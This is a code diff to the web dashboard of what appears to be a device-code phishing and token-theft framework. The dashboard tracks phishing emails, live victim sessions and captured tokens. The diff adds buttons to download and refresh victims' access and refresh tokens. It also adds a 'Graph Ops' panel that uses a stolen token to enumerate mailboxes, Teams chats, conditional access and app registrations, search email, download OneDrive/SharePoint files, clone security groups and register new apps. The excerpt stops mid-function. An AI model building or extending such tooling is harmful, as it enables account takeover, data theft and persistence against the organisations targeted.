@@ -98,7 +98,8 @@
   .layout {
     display: grid;
     grid-template-columns: 290px 1fr;
-    min-height: calc(100vh - 57px);
+    height: calc(100vh - 57px);
+    overflow: hidden;
   }
 
   .sidebar {
@@ -106,6 +107,7 @@
     border-right: 1px solid var(--border);
     padding: 20px;
     overflow-y: auto;
+    height: 100%;
   }
 
   .sidebar-section { margin-bottom: 24px; }
@@ -176,7 +178,13 @@
   .checkbox-group input[type=checkbox] { width: auto; }
   .checkbox-group label { font-size: 11px; color: var(--text-dim); margin-bottom: 0; }
 
-  .main { padding: 24px; overflow-y: auto; }
+  .main {
+    padding: 24px;
+    overflow-x: hidden;
+    overflow-y: auto;
+    height: 100%;
+    min-width: 0; /* prevent grid blowout */
+  }
 
   .section-header {
     font-family: var(--sans);
@@ -200,7 +208,7 @@
 
   .stats-grid {
     display: grid;
-    grid-template-columns: repeat(5, 1fr);
+    grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
     gap: 12px;
     margin-bottom: 24px;
   }
@@ -246,11 +254,22 @@
     color: var(--text-dim);
   }
 
-  .data-table {
-    width: 100%;
-    border-collapse: collapse;
+  .table-wrap {
+    display: block;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
     margin-bottom: 24px;
   }
+
+  .data-table {
+    width: max-content;
+    min-width: 100%;
+    border-collapse: collapse;
+    white-space: nowrap;
+  }
+
+  /* Allow wrapping only in specific cells that need it */
+  .data-table td.wrap { white-space: normal; min-width: 180px; max-width: 320px; word-break: break-word; }
 
   .data-table th {
     text-align: left;
@@ -373,6 +392,51 @@
 
   .tab-content { display: none; }
   .tab-content.active { display: block; }
+
+  /* Graph ops layout */
+  .graph-layout {
+    display: grid;
+    grid-template-columns: 260px 1fr;
+    gap: 16px;
+    align-items: start;
+  }
+
+  .graph-sidebar {
+    position: sticky;
+    top: 0;
+    max-height: calc(100vh - 180px);
+    overflow-y: auto;
+  }
+
+  .graph-output-panel {
+    min-width: 0;
+  }
+
+  #graphOutput {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 2px;
+    padding: 16px;
+    font-size: 12px;
+    overflow-x: hidden;  /* inner .table-wrap handles horizontal scroll */
+    overflow-y: auto;
+    max-height: calc(100vh - 220px);
+    color: var(--text-dim);
+  }
+
+  #graphOutput .table-wrap {
+    margin-bottom: 0;
+  }
+
+  /* Responsive breakpoints */
+  @media (max-width: 900px) {
+    .layout { grid-template-columns: 1fr; height: auto; overflow: visible; }
+    .sidebar { height: auto; border-right: none; border-bottom: 1px solid var(--border); }
+    .main { height: auto; overflow-y: visible; }
+    .graph-layout { grid-template-columns: 1fr; }
+    .graph-sidebar { position: static; max-height: none; }
+    #graphOutput { max-height: 60vh; }
+  }
 
   .notification {
     position: fixed;
@@ -639,6 +703,7 @@
       <div class="tabs">
         <button class="tab active" onclick="switchTab('sessions', this)">Sessions</button>
         <button class="tab" onclick="switchTab('tokens', this)">Captured Tokens</button>
+        <button class="tab" onclick="switchTab('graph', this)">Graph Ops</button>
         <button class="tab" onclick="switchTab('targets', this)">Targets</button>
         <button class="tab" onclick="switchTab('emails', this)">Emails Sent</button>
       </div>
@@ -646,30 +711,48 @@
       <!-- Sessions tab -->
       <div id="tab-sessions" class="tab-content active">
         <div class="section-header">Live Sessions</div>
-        <table class="data-table">
-          <thead>
-            <tr>
-              <th>Target Email</th>
-              <th>User Code</th>
-              <th>Status</th>
-              <th>Poll Count</th>
-              <th>Expires</th>
-              <th>UPN (resolved)</th>
-            </tr>
-          </thead>
-          <tbody id="sessionsBody">
-            <tr><td colspan="6" style="text-align:center;padding:32px;color:var(--text-dim)">No active sessions</td></tr>
-          </tbody>
-        </table>
+        <div class="table-wrap">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>Target Email</th>
+                <th>User Code</th>
+                <th>Status</th>
+                <th>Poll Count</th>
+                <th>Expires</th>
+                <th>UPN (resolved)</th>
+              </tr>
+            </thead>
+            <tbody id="sessionsBody">
+              <tr><td colspan="6" style="text-align:center;padding:32px;color:var(--text-dim)">No active sessions</td></tr>
+            </tbody>
+          </table>
+        </div>
       </div>
 
       <!-- Tokens tab -->
       <div id="tab-tokens" class="tab-content">
         <div class="section-header">Captured Tokens</div>
-        <div class="capture-log">
+        <div class="table-wrap">
+          <table class="data-table" id="tokensTable">
+            <thead>
+              <tr>
+                <th>Target Email</th>
+                <th>UPN</th>
+                <th>Captured At</th>
+                <th>Scope</th>
+                <th style="min-width:260px">Actions</th>
+              </tr>
+            </thead>
+            <tbody id="tokensBody">
+              <tr><td colspan="5" style="text-align:center;padding:32px;color:var(--text-dim)">Waiting for tokens...</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="capture-log" style="margin-top:16px">
           <div class="capture-log-header">
             <span style="width:8px;height:8px;border-radius:50%;background:var(--accent3);display:inline-block;animation:pulse 1s infinite"></span>
-            Token Capture Log
+            Live Capture Log
           </div>
           <div class="capture-log-body" id="tokenLog">
             <div style="padding:24px;text-align:center;color:var(--text-dim);font-size:11px">Waiting for tokens...</div>
@@ -677,41 +760,106 @@
         </div>
       </div>
 
+      <!-- Graph Ops tab -->
+      <div id="tab-graph" class="tab-content">
+        <div class="section-header">Graph API Operations</div>
+        <div class="graph-layout">
+          <!-- Left: target selector + op buttons -->
+          <div class="graph-sidebar">
+            <div class="config-card">
+              <div class="config-card-title">Target</div>
+              <div class="input-group">
+                <label>Captured Session</label>
+                <select id="graphTargetSelect" onchange="graphTargetChanged()">
+                  <option value="">— select captured target —</option>
+                </select>
+              </div>
+              <div style="font-size:10px;letter-spacing:0.1em;text-transform:uppercase;color:var(--text-dim);margin:12px 0 8px">Enumeration</div>
+              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('me')">👤 Whoami (/me)</button>
+              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('mailboxes')">📬 Discover Mailboxes</button>
+              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('groups')">🏢 List Groups</button>
+              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('owned-groups')">✏ Owned / Modifiable Groups</button>
+              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('teams')">💬 Joined Teams</button>
+              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('chats')">💬 Teams Chats</button>
+              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('conditional-access')">🔒 Dump Conditional Access</button>
+              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('apps')">📦 Dump App Registrations</button>
+              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('grants')">🔑 OAuth2 Permission Grants</button>
+
+              <div style="font-size:10px;letter-spacing:0.1em;text-transform:uppercase;color:var(--text-dim);margin:12px 0 8px">Search</div>
+              <div class="input-group">
+                <input type="text" id="graphSearchQuery" placeholder="keyword / *">
+              </div>
+              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphSearch('emails')">📧 Search Emails</button>
+              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="driveOpen('root')">📁 Browse OneDrive / SharePoint</button>
+              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphSearch('files')">🔍 Search Files</button>
+              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphSearch('users')">🔍 Search User Attributes</button>
+
+              <div style="font-size:10px;letter-spacing:0.1em;text-transform:uppercase;color:var(--text-dim);margin:12px 0 8px">Actions</div>
+              <div class="input-group">
+                <input type="text" id="graphCloneSrc" placeholder="Source group ID">
+                <input type="text" id="graphCloneName" placeholder="New group display name" style="margin-top:4px">
+              </div>
+              <button class="btn btn-sm btn-warn" style="width:100%;margin-bottom:4px" onclick="graphCloneGroup()">🔁 Clone Security Group</button>
+              <div class="input-group" style="margin-top:8px">
+                <input type="text" id="graphAppName" placeholder="App display name">
+                <input type="text" id="graphAppRedirect" placeholder="Redirect URI (optional)" style="margin-top:4px">
+              </div>
+              <button class="btn btn-sm btn-warn" style="width:100%;margin-bottom:4px" onclick="graphDeployApp()">⚡ Deploy App Registration</button>
+            </div>
+          </div>
+          <!-- Right: output -->
+          <div class="graph-output-panel">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:6px">
+              <span style="font-size:10px;letter-spacing:0.15em;text-transform:uppercase;color:var(--text-dim)" id="graphOpLabel">Output</span>
+              <div id="graphBtnBar" style="display:flex;gap:6px;align-items:center">
+                <button class="btn btn-sm" id="graphRawBtn" onclick="graphToggleRaw()" style="display:none">{ } Raw JSON</button>
+                <button class="btn btn-sm" id="graphDlBtn" onclick="graphDownloadResult()" style="display:none">↓ Download JSON</button>
+              </div>
+            </div>
+            <div id="graphOutput">Select a target and operation...</div>
+          </div>
+        </div>
+      </div>
+
       <!-- Targets tab -->
       <div id="tab-targets" class="tab-content">
         <div class="section-header">Loaded Targets</div>
-        <table class="data-table">
-          <thead>
-            <tr>
-              <th>Email</th>
-              <th>Display Name</th>
-              <th>Department</th>
-              <th>Region</th>
-              <th>Group</th>
-            </tr>
-          </thead>
-          <tbody id="targetsBody">
-            <tr><td colspan="5" style="text-align:center;padding:32px;color:var(--text-dim)">No targets imported</td></tr>
-          </tbody>
-        </table>
+        <div class="table-wrap">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>Email</th>
+                <th>Display Name</th>
+                <th>Department</th>
+                <th>Region</th>
+                <th>Group</th>
+              </tr>
+            </thead>
+            <tbody id="targetsBody">
+              <tr><td colspan="5" style="text-align:center;padding:32px;color:var(--text-dim)">No targets imported</td></tr>
+            </tbody>
+          </table>
+        </div>
       </div>
 
       <!-- Emails tab -->
       <div id="tab-emails" class="tab-content">
         <div class="section-header">Email Send Results</div>
-        <table class="data-table">
-          <thead>
-            <tr>
-              <th>Target Email</th>
-              <th>Status</th>
-              <th>Sent At</th>
-              <th>Error</th>
-            </tr>
-          </thead>
-          <tbody id="emailResultsBody">
-            <tr><td colspan="4" style="text-align:center;padding:32px;color:var(--text-dim)">No emails sent yet</td></tr>
-          </tbody>
-        </table>
+        <div class="table-wrap">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>Target Email</th>
+                <th>Status</th>
+                <th>Sent At</th>
+                <th>Error</th>
+              </tr>
+            </thead>
+            <tbody id="emailResultsBody">
+              <tr><td colspan="4" style="text-align:center;padding:32px;color:var(--text-dim)">No emails sent yet</td></tr>
+            </tbody>
+          </table>
+        </div>
       </div>
     </div>
 
@@ -876,6 +1024,7 @@ let eventSource = null;
 let tokensSeen = new Set();
 let editingProfileID = null;
 let editingTemplateID = null;
+let graphLastResult = null;
 
 // ─── Notification ────────────────────────────────────────────────────────────
 function notify(msg, error=false) {
@@ -1159,6 +1308,8 @@ function renderNewTokens(completed) {
     if (log.querySelector('div[style*="Waiting"]')) log.innerHTML = '';
     log.insertBefore(entry, log.firstChild);
     notify('TOKEN CAPTURED: ' + identity);
+    // Refresh token table and graph target selector
+    loadTokenLog();
   });
 }
 
@@ -1166,6 +1317,43 @@ async function loadTokenLog() {
   if (!activeCampaignID) return;
   const tokens = await api('GET', '/campaigns/' + activeCampaignID + '/tokens');
   if (!Array.isArray(tokens) || tokens.length === 0) return;
+
+  // Populate tokens table with action buttons
+  const tbody = document.getElementById('tokensBody');
+  tbody.innerHTML = tokens.map(t => {
+    const identity = t.upn || t.target_email;
+    const tid = encodeURIComponent(t.target_id);
+    const cid = activeCampaignID;
+    return `
+      <tr>
+        <td style="color:var(--text-bright)">${t.target_email}</td>
+        <td style="color:var(--accent3)">${identity}</td>
+        <td style="color:var(--text-dim);font-size:11px">${formatTime(t.redeemed_at)}</td>
+        <td style="color:var(--text-dim);font-size:10px;max-width:160px;overflow:hidden;text-overflow:ellipsis">${t.scope || '—'}</td>
+        <td>
+          <div style="display:flex;gap:4px;flex-wrap:wrap">
+            <button class="btn btn-sm" title="Download Access Token" onclick="dlToken('${cid}','${tid}','access-token','at_${t.target_email}.txt')">↓ AT</button>
+            <button class="btn btn-sm" title="Download Refresh Token" onclick="dlToken('${cid}','${tid}','refresh-token','rt_${t.target_email}.txt')">↓ RT</button>
+            <button class="btn btn-sm btn-primary" title="Refresh access token using refresh token" onclick="refreshUserToken('${cid}','${tid}','${t.target_email}',this)">↺ Refresh</button>
+          </div>
+        </td>
+      </tr>
+    `;
+  }).join('');
+
+  // Also populate graph target dropdown
+  const sel = document.getElementById('graphTargetSelect');
+  const prev = sel.value;
+  while (sel.options.length > 1) sel.remove(1);
+  tokens.forEach(t => {
+    const opt = document.createElement('option');
+    opt.value = t.target_id;
+    opt.textContent = (t.upn || t.target_email);
+    sel.appendChild(opt);
+  });
+  if (prev) sel.value = prev;
+
+  // Append new entries to live log
   const log = document.getElementById('tokenLog');
   if (log.querySelector('div[style*="Waiting"]')) log.innerHTML = '';
   tokens.forEach(t => {
@@ -1179,10 +1367,33 @@ async function loadTokenLog() {
       <span class="log-email">${t.target_email}</span>
       <span style="color:var(--text-dim)">→</span>
       <span class="log-upn">${identity}</span>
-      <span style="color:var(--text-dim);margin-left:auto;font-size:10px;color:var(--text-dim)">${t.scope ? t.scope.split(' ')[0] : ''}</span>
+      <span style="color:var(--text-dim);margin-left:auto;font-size:10px">${t.scope ? t.scope.split(' ')[0] : ''}</span>
     `;
     log.insertBefore(entry, log.firstChild);
   });
+}
+
+function dlToken(campaignID, targetID, tokenType, filename) {
+  const a = document.createElement('a');
+  a.href = '/api/campaigns/' + campaignID + '/tokens/' + targetID + '/' + tokenType;
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+}
+
+async function refreshUserToken(campaignID, targetID, email, btn) {
+  btn.disabled = true;
+  btn.textContent = '…';
+  const result = await api('POST', '/campaigns/' + campaignID + '/tokens/' + targetID + '/refresh');
+  btn.disabled = false;
+  btn.textContent = '↺ Refresh';
+  if (result.error) {
+    notify('Refresh failed for ' + email + ': ' + result.error, true);
+    return;
+  }
+  notify('Token refreshed for ' + email);
+  loadTokenLog();
 }
 
 // ─── Sender profiles ─────────────────────────────────────────────────────────
@@ -1427,7 +1638,401 @@ function switchTab(name, btn) {
   btn.classList.add('active');
   document.getElementById('tab-' + name).classList.add('active');
   if (name === 'tokens') loadTokenLog();
+  if (name === 'graph') loadTokenLog(); // populates target dropdown
   if (name === 'emails') loadEmailResults();
+}
+
+// ─── Graph Ops ────────────────────────────────────────────────────────────────
+
+let graphRawMode = false;
+let graphCurrentOp = '';
+
+function graphTargetChanged() {
+  graphSetOutput('<span style="color:var(--text-dim)">Select an operation...</span>');
+  graphLastResult = null;
+  graphRawMode = false;
+  document.getElementById('graphRawBtn').style.display = 'none';
+  document.getElementById('graphDlBtn').style.display = 'none';
+}
+
+function graphSetOutput(html) {
+  document.getElementById('graphOutput').innerHTML = html;
+}
+
+function graphLoading(label) {
+  document.getElementById('graphOpLabel').textContent = label;
+  document.getElementById('graphRawBtn').style.display = 'none';
+  document.getElementById('graphDlBtn').style.display = 'none';
+  graphSetOutput('<span style="color:var(--text-dim)">⏳ Loading...</span>');
+}
+
+function graphToggleRaw() {
+  graphRawMode = !graphRawMode;
+  if (graphRawMode) {
+    // Raw mode: show only "⊞ Table View", hide download
+    document.getElementById('graphRawBtn').textContent = '⊞ Table View';
+    document.getElementById('graphDlBtn').style.display = 'none';
+    graphSetOutput('<pre style="white-space:pre-wrap;font-size:11px;color:var(--text-bright);margin:0">' + escH(JSON.stringify(graphLastResult, null, 2)) + '</pre>');
+  } else {
+    // Table mode: show "{ } Raw JSON" + download
+    document.getElementById('graphRawBtn').textContent = '{ } Raw JSON';
+    document.getElementById('graphDlBtn').style.display = '';
+    graphRender(graphCurrentOp, graphLastResult);
+  }
+}
+
+
+function graphFinish(op, json) {
+  graphLastResult = json;
+  graphCurrentOp = op;
+  graphRawMode = false;
+  // Reset to table mode: show Raw + Download, Raw btn says "{ } Raw JSON"
+  document.getElementById('graphRawBtn').style.display = '';
+  document.getElementById('graphRawBtn').textContent = '{ } Raw JSON';
+  document.getElementById('graphDlBtn').style.display = '';
+  if (json && json.error) {
+    graphSetOutput(`<div style="color:var(--accent2);padding:12px">⚠ ${escH(json.error)}</div>`);
+    notify('Graph error: ' + json.error, true);
+    return;
+  }
+  graphRender(op, json);
+}
+
+function graphRender(op, data) {
+  const out = document.getElementById('graphOutput');
+  // Single-object ops get a KV grid; everything else gets the generic table
+  if (op === 'me' || op === 'clone-group' || op === 'deploy-app') {
+    out.innerHTML = renderKV(data, op);
+    return;
+  }
+  // "apps" wraps two lists
+  if (op === 'apps') {
+    out.innerHTML = renderApps(data);
+    return;
+  }
+  // Everything else: extract the .value array (or treat as array)
+  const items = data && (Array.isArray(data) ? data : (data.value || []));
+  out.innerHTML = renderAllFields(items, op);
+}
+
+// ── generic renderers ─────────────────────────────────────────────────────────
+
+// Renders ANY array of objects as a table with ALL their fields as columns.
+function renderAllFields(items, label) {
+  if (!items || !items.length) return empty('No data returned');
+
+  // Collect all unique keys in order of first appearance,
+  // but pin high-priority keys to the front.
+  const priority = ['id','appId','displayName','name','subject','userPrincipalName','mail','state','status'];
+  const keySet = new Set();
+  const keyOrder = [];
+  items.forEach(item => flatKeys(item).forEach(k => {
+    if (!keySet.has(k)) { keySet.add(k); keyOrder.push(k); }
+  }));
+  const keys = [
+    ...priority.filter(k => keySet.has(k)),
+    ...keyOrder.filter(k => !priority.includes(k)),
+  ];
+
+  const ths = keys.map(k => `<th style="white-space:nowrap">${escH(k)}</th>`).join('');
+  const trs = items.map(item =>
+    '<tr>' + keys.map(k => `<td>${renderVal(item[k], k)}</td>`).join('') + '</tr>'
+  ).join('');
+
+  return `<div class="table-wrap"><table class="data-table"><thead><tr>${ths}</tr></thead><tbody>${trs}</tbody></table></div>`
+       + `<div style="color:var(--text-dim);font-size:10px;padding:6px 0;text-align:right">${items.length} items</div>`;
+}
+
+// Renders a single object as a key→value grid (shows ALL fields).
+function renderKV(obj, op) {
+  if (!obj) return empty('No data');
+
+  // Action success banner for write ops
+  let banner = '';
+  if (op === 'deploy-app' || op === 'clone-group') {
+    const label = op === 'deploy-app' ? 'App registered' : 'Group cloned';
+    banner = `<div style="color:var(--accent3);margin-bottom:12px;font-size:12px">✓ ${label} successfully</div>`;
+  }
+
+  const rows = Object.entries(obj).map(([k, v], i) => {
+    const bg = i % 2 ? 'var(--bg2)' : 'var(--bg3)';
+    return `
+      <div style="padding:7px 12px;background:${bg};color:var(--text-dim);font-size:11px;border-bottom:1px solid var(--border);white-space:nowrap">${escH(k)}</div>
+      <div style="padding:7px 12px;background:${bg};color:var(--text-bright);font-size:12px;border-bottom:1px solid var(--border);word-break:break-all">${renderVal(v, k)}</div>`;
+  }).join('');
+
+  return banner + `<div style="overflow-x:auto"><div style="display:grid;grid-template-columns:200px 1fr;border:1px solid var(--border);border-radius:2px;overflow:hidden;min-width:360px">${rows}</div></div>`;
+}
+
+function renderApps(d) {
+  if (!d) return empty('No data');
+  const appItems = (d.app_registrations && d.app_registrations.value) || [];
+  const spItems  = (d.service_principals && d.service_principals.value) || [];
+  let html = '';
+  if (appItems.length) {
+    html += section('App Registrations', appItems.length);
+    html += renderAllFields(appItems, 'app registrations');
+  }
+  if (spItems.length) {
+    html += section('Service Principals / Enterprise Apps', spItems.length);
+    html += renderAllFields(spItems, 'service principals');
+  }
+  return html || empty('No apps found (may require Application.Read.All)');
+}
+
+// ── value renderer ────────────────────────────────────────────────────────────
+
+function renderVal(v, key) {
+  if (v === null || v === undefined) return `<span style="color:var(--text-dim);font-size:11px">—</span>`;
+
+  if (typeof v === 'boolean')
+    return v ? badge('true','var(--accent3)') : badge('false','var(--text-dim)');
+
+  if (typeof v === 'number')
+    return `<span style="color:var(--accent)">${v}</span>`;
+
+  if (typeof v === 'string') {
+    // ISO date
+    if (/^\d{4}-\d{2}-\d{2}T/.test(v))
+      return `<span style="color:var(--text-dim);font-size:11px">${new Date(v).toLocaleString()}</span>`;
+    // URL
+    if (/^https?:\/\//.test(v))
+      return `<a href="${escH(v)}" target="_blank" style="color:var(--accent);font-size:11px">${escH(truncate(v,60))}</a>`;
+    // Long string — truncate with full value in tooltip
+    if (v.length > 80)
+      return `<span style="color:var(--text-bright);font-size:11px" title="${escH(v)}">${escH(truncate(v,80))}<span style="color:var(--text-dim)">…</span></span>`;
+    return `<span style="color:var(--text-bright);font-size:11px">${escH(v)}</span>`;
+  }
+
+  if (Array.isArray(v)) {
+    if (!v.length) return `<span style="color:var(--text-dim);font-size:10px">[]</span>`;
+    // Array of simple strings/numbers → join as pills
+    if (v.every(x => typeof x !== 'object' || x === null))
+      return v.map(x => badge(String(x), 'var(--accent)')).join(' ');
+    // Array of objects → "[N items]" with JSON tooltip
+    return `<span style="color:var(--warn);font-size:11px;cursor:help" title="${escH(JSON.stringify(v, null, 2))}">[${v.length} items ↗]</span>`;
+  }
+
+  if (typeof v === 'object') {
+    // Flatten common nested objects inline
+    const str = JSON.stringify(v);
+    if (str.length <= 120) return `<span style="color:var(--text-dim);font-size:10px;font-family:var(--mono)">${escH(str)}</span>`;
+    return `<span style="color:var(--text-dim);font-size:11px;cursor:help" title="${escH(JSON.stringify(v, null, 2))}">{object ↗}</span>`;
+  }
+
+  return `<span style="color:var(--text-bright);font-size:11px">${escH(String(v))}</span>`;
+}
+
+// ── helpers ───────────────────────────────────────────────────────────────────
+
+// Returns all top-level keys of an object (does NOT recurse — keeps columns flat).
+function flatKeys(obj) {
+  if (!obj || typeof obj !== 'object') return [];
+  return Object.keys(obj);
+}
+
+function truncate(s, n) { return s.length > n ? s.substring(0, n) : s; }
+function escH(s) { return String(s == null ? '' : s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function badge(v,c) { return `<span style="background:${c}22;color:${c};border:1px solid ${c}44;border-radius:2px;padding:1px 5px;font-size:10px;white-space:nowrap">${escH(v)}</span>`; }
+function empty(msg) { return `<div style="padding:32px;text-align:center;color:var(--text-dim);font-size:11px">${escH(msg)}</div>`; }
+function section(title, n) { return `<div style="font-size:10px;letter-spacing:0.15em;text-transform:uppercase;color:var(--accent);margin:16px 0 8px">${escH(title)} (${n})</div>`; }
+
+// ── drive browser ─────────────────────────────────────────────────────────────
+
+let driveStack = []; // breadcrumb stack: [{id, name}]
+
+async function driveOpen(itemID, name) {
+  const targetID = document.getElementById('graphTargetSelect').value;
+  if (!targetID || !activeCampaignID) { notify('Select a captured target first', true); return; }
+
+  if (itemID === 'root') {
+    driveStack = [{ id: 'root', name: 'OneDrive' }];
+  } else {
+    // If already in stack (going back), trim to that point
+    const idx = driveStack.findIndex(e => e.id === itemID);
+    if (idx >= 0) driveStack = driveStack.slice(0, idx + 1);
+    else driveStack.push({ id: itemID, name: name || itemID });
+  }
+
+  graphCurrentOp = 'drive';
+  graphLastResult = null;
+  document.getElementById('graphOpLabel').textContent = 'Drive: ' + driveStack.map(e => e.name).join(' / ');
+  document.getElementById('graphRawBtn').style.display = 'none';
+  document.getElementById('graphDlBtn').style.display = 'none';
+  graphSetOutput('<span style="color:var(--text-dim)">⏳ Loading...</span>');
+
+  const url = '/api/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(targetID)
+    + '/drive/ls?item=' + encodeURIComponent(itemID === 'root' ? '' : itemID);
+  try {
+    const r = await fetch(url);
+    const json = await r.json();
+    graphLastResult = json;
+    document.getElementById('graphOutput').innerHTML = renderDriveListing(json, targetID);
+  } catch(e) {
+    graphSetOutput(`<span style="color:var(--accent2)">${escH(e.message)}</span>`);
+  }
+}
+
+function renderDriveListing(data, targetID) {
+  const items = (data && data.value) || [];
+  const cid = activeCampaignID;
+
+  // Breadcrumb
+  const crumbs = driveStack.map((e, i) =>
+    i < driveStack.length - 1
+      ? `<span style="color:var(--accent);cursor:pointer" onclick="driveOpen('${escH(e.id)}','${escH(e.name)}')">${escH(e.name)}</span>`
+      : `<span style="color:var(--text-bright)">${escH(e.name)}</span>`
+  ).join(`<span style="color:var(--text-dim);margin:0 6px">/</span>`);
+
+  if (!items.length) return `<div style="margin-bottom:12px">${crumbs}</div>` + empty('Empty folder');
+
+  // Sort: folders first, then files
+  items.sort((a, b) => {
+    const af = !!a.folder, bf = !!b.folder;
+    if (af !== bf) return bf - af;
+    return (a.name || '').localeCompare(b.name || '');
+  });
+
+  const rows = items.map(item => {
+    const isFolder = !!item.folder;
+    const icon = isFolder ? '📁' : fileIcon(item.name);
+    const size = item.size != null ? fmtSize(item.size) : '—';
+    const modified = item.lastModifiedDateTime
+      ? new Date(item.lastModifiedDateTime).toLocaleString() : '—';
+    const nameCell = isFolder
+      ? `<span style="color:var(--accent);cursor:pointer;font-weight:500" onclick="driveOpen('${escH(item.id)}','${escH(item.name)}')">${icon} ${escH(item.name)}</span>`
+      : `<span style="color:var(--text-bright)">${icon} ${escH(item.name)}</span>`;
+
+    const dlBtn = !isFolder
+      ? `<button class="btn btn-sm" style="padding:2px 8px" onclick="driveDownload('${cid}','${escH(targetID)}','${escH(item.id)}','${escH(item.name)}')">↓</button>`
+      : `<button class="btn btn-sm" style="padding:2px 8px;opacity:0.4" title="Folder download not supported" disabled>↓</button>`;
+
+    return `<tr>
+      <td style="width:24px;text-align:center">${isFolder ? '📁' : fileIcon(item.name)}</td>
+      <td>${nameCell.replace(icon+' ','')}</td>
+      <td style="color:var(--text-dim);font-size:11px;white-space:nowrap">${size}</td>
+      <td style="color:var(--text-dim);font-size:11px;white-space:nowrap">${modified}</td>
+      <td style="white-space:nowrap">${dlBtn}
+        ${item.webUrl ? `<a href="${escH(item.webUrl)}" target="_blank" class="btn btn-sm" style="padding:2px 8px;margin-left:2px">↗</a>` : ''}
+      </td>
+    </tr>`;
+  }).join('');
+
+  return `
+    <div style="margin-bottom:10px;font-size:12px">${crumbs}</div>
+    <div class="table-wrap">
+      <table class="data-table">
+        <thead><tr><th style="width:24px"></th><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr></thead>
+        <tbody>${rows}</tbody>
+      </table>
+    </div>
+    <div style="color:var(--text-dim);font-size:10px;padding:6px 0;text-align:right">${items.length} items</div>`;
+}
+
+function driveDownload(campaignID, targetID, itemID, name) {
+  const a = document.createElement('a');
+  a.href = '/api/campaigns/' + campaignID + '/graph/' + encodeURIComponent(targetID)
+         + '/drive/download?item=' + encodeURIComponent(itemID) + '&name=' + encodeURIComponent(name);
+  a.download = name;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  notify('Downloading: ' + name);
+}
+
+function fmtSize(bytes) {
+  if (bytes < 1024) return bytes + ' B';
+  if (bytes < 1048576) return (bytes/1024).toFixed(1) + ' KB';
+  if (bytes < 1073741824) return (bytes/1048576).toFixed(1) + ' MB';
+  return (bytes/1073741824).toFixed(2) + ' GB';
+}
+
+function fileIcon(name) {
+  if (!name) return '📄';
+  const ext = name.split('.').pop().toLowerCase();
+  const map = {
+    pdf:'📕', doc:'📝', docx:'📝', xls:'📊', xlsx:'📊', ppt:'📊', pptx:'📊',
+    txt:'📄', csv:'📋', json:'📋', xml:'📋',
+    zip:'📦', rar:'📦', '7z':'📦', gz:'📦',
+    png:'🖼', jpg:'🖼', jpeg:'🖼', gif:'🖼', svg:'🖼', webp:'🖼',
+    mp4:'🎬', mov:'🎬', avi:'🎬', mkv:'🎬',
+    mp3:'🎵', wav:'🎵', flac:'🎵',
+    js:'💻', ts:'💻', py:'💻', go:'💻', sh:'💻', ps1:'💻',
+  };
+  return map[ext] || '📄';
+}
+
+// ── dispatchers ───────────────────────────────────────────────────────────────
+
+async function graphOp(op) {
+  const targetID = document.getElementById('graphTargetSelect').value;
+  if (!targetID || !activeCampaignID) { notify('Select a captured target first', true); return; }
+  graphLoading(op);
+  try {
+    const r = await fetch('/api/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(targetID) + '/' + op);
+    graphFinish(op, await r.json());
+  } catch(e) { graphSetOutput(`<span style="color:var(--accent2)">${escH(e.message)}</span>`); }
+}
+
+async function graphSearch(type) {
+  const targetID = document.getElementById('graphTargetSelect').value;
+  if (!targetID || !activeCampaignID) { notify('Select a captured target first', true); return; }
+  const query = document.getElementById('graphSearchQuery').value.trim() || '*';
+  graphLoading(type + ': ' + query);
+  try {
+    const r = await fetch('/api/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(targetID) + '/' + type, {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ query, top: 50 })
+    });
+    graphFinish(type, await r.json());
+  } catch(e) { graphSetOutput(`<span style="color:var(--accent2)">${escH(e.message)}</span>`); }
+}
+
+async function graphCloneGroup() {
+  const targetID = document.getElementById('graphTargetSelect').value;
+  if (!targetID || !activeCampaignID) { notify('Select a captured target first', true); return; }
+  const sourceGroupID  = document.getElementById('graphCloneSrc').value.trim();
+  const newDisplayName = document.getElementById('graphCloneName').value.trim();
+  if (!sourceGroupID || !newDisplayName) { notify('Source group ID and new name required', true); return; }
+  graphLoading('clone-group');
+  try {
+    const r = await fetch('/api/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(targetID) + '/clone-group', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ source_group_id: sourceGroupID, new_display_name: newDisplayName })
+    });
+    const json = await r.json();
+    graphFinish('clone-group', json);
+    if (!json.error) notify('Group cloned: ' + newDisplayName);
+  } catch(e) { graphSetOutput(`<span style="color:var(--accent2)">${escH(e.message)}</span>`); }
+}
+
+async function graphDeployApp() {
+  const targetID = document.getElementById('graphTargetSelect').value;
